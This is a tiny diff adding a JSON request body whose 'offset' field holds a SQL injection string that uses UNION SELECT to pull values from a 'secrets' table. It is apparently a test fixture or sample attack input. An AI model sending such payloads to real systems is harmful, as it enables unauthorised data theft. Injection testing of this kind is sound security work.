@@ -1,0 +1,4 @@
+{
+"sorting": "newest",
+"offset": "' UNION SELECT secret,1,1,1,1,1,1,1 FROM secrets --"
+}
